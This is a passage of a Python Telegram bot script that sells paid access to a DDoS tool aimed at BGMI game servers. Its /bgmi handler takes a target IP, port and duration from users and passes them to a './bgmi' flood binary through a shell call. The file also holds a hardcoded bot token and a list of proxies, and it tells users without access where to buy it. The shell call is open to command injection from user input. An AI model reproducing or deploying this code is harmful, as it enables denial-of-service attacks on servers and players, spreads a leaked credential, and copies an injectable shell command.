...
# @YBD OFFICIAL GRP#bgmiddoserpython
...
# @YBD OFFICIAL GRPTg #from keep_alive import keep_alive
# @YBD OFFICIAL GRP #keep_alive()
# @YBD OFFICIAL GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('7297622896:AAHAuPFYxXoXm9pq-tvk4LUAPs5UVNSmg0Q')

# @YBD OFFICIAL GRP # Admin user IDs
admin_id = ["5844304219"]

# @YBD OFFICIAL GRP # File to store allowed user IDs
USER_FILE = "users.txt"

# @YBD OFFICIAL GRP # File to store command logs
LOG_FILE = "log.txt"


# @YBD OFFICIAL GRP # List of proxy addresses
PROXIES = [
...
"https://162.223.94.164:80",#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
"https://50.168.163.182:80",#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
"https://3.12.144.146:3128",#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
"https://50.174.7.157:80",#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
"https://12.186.205.122:80",#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
"https://50.239.72.18:80",#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
"https://134.73.65.97:6649"
    # @YBD OFFICIAL GRP # Add more proxy addresses as needed
]
...
# @YBD OFFICIAL GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @YBD OFFICIAL GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
# @YBD OFFICIAL GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @YBD OFFICIAL GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @YBD OFFICIAL GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
# @YBD OFFICIAL GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
def add_user(message):
    ...
    if user_id in admin_id:
        command = message.text.split()#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
#script by @ybd official 🚩
...
# @YBD OFFICIAL GRP # Function to handle the reply when free users run the /bgmi command
...
# @YBD OFFICIAL GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
...
# @YBD OFFICIAL GRP # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @YBD OFFICIAL GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @YBD OFFICIAL GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @YBD OFFICIAL GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @YBD OFFICIAL GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @YBD OFFICIAL GRP # Convert time to integer
            time = int(command[3])  # @YBD OFFICIAL GRP # Convert port to integer
            if time > 1200:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 𝒍𝒆𝒔𝒔 𝒕𝒉𝒂𝒏 𝟣𝟤𝟢𝟢 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @YBD OFFICIAL GRP # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝓨𝘉𝘋 ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /𝒃𝒈𝒎𝒊 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /𝒃𝒈𝒎𝒊 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══𝓨𝘉𝘋 ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"  # @YBD OFFICIAL GRP # Updated command syntax
    else:
        response = "🚫𝒀𝒐𝒖 𝒅𝒐 𝒏𝒐𝒕 𝒉𝒂𝒗𝒆 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎 :- @ArpitJaiswal220🚫\n𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙛𝙩𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙬𝙤𝙧𝙙 /bgmi \n𝙘𝙤𝙣𝙩𝙖𝙘𝙩 :- @ArpitJaiswal220\n\n═══𝓨𝘉𝘋 ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"

    bot.reply_to(message, response)



# @YBD OFFICIAL GRP # Add /mylogs command to display logs recorded for bgmi and website commands
